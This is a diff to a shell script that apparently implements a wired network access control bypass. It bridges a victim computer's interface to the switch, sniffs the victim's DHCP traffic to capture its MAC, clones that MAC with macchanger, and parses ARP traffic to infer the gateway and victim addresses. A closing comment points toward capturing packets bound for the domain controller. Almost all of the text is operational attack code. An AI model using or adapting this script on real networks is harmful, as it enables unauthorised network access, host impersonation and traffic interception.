@@ -7,6 +7,13 @@ COMPINT=eth3
 ARPS=50 # if needed
 TCP=445 # if needed
 
+ifconfig $COMPINT 0.0.0.0 up promisc
+echo [!] Plug in $COMPINT
+tcpdump -i $COMPINT -nne -l -s0 -c1 port 67 | tee boot.capture
+COMPMAC=`cat boot.capture | awk '{ print $2}' | head -1`
+ifconfig $COMPINT down
+macchanger -m $COMPMAC $SWINT
+
 echo [*] Building interface bridge...
 brctl addbr $BRINT
 brctl addif $BRINT $COMPINT
@@ -18,6 +25,7 @@ ifconfig $SWINT 0.0.0.0 up promisc
 ifconfig $BRINT 0.0.0.0 up promisc
 
 # sleeping to let things settle a tad
+echo [*] Sleeping...
 sleep 5
 
 mii-tool -r $COMPINT
@@ -25,11 +33,12 @@ mii-tool -r $SWINT
 
 echo [*] Getting info from traffic...
 # get variables using arp
-tcpdump -i $COMPINT -nne -l -s0 -c$ARPS arp | tee boot.capture
+echo [!] Plug in $SWINT
+tcpdump -i $SWINT -nne -l -s0 -c$ARPS arp | tee boot.capture
 echo [*] Done receiving traffic. Processing...
 GWMAC=`cat boot.capture | grep 'is-at' | awk '{ print $2 "," $4  $11 "," $13}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $4}'`
 GWIP=`cat boot.capture | grep 'is-at' | awk '{ print $2 "," $4  $11 "," $13}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $3}'`
-COMPMAC=`cat boot.capture | grep 'is-at' | awk '{ print $2 "," $4  $11 "," $13}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $2}'`
+#COMPMAC=`cat boot.capture | grep 'is-at' | awk '{ print $2 "," $4  $11 "," $13}' | sort | uniq -c | sort -rn | head -1 | awk -F ',' '{print $2}'`
 COMPIP=`cat boot.capture | grep $COMPMAC | grep -w "$GWIP tell"| head -1 | awk '{print $14}' | cut -d, -f 1`
 
 # grab a single tcp packet destined for the DC (kerberos, smb, etc.)
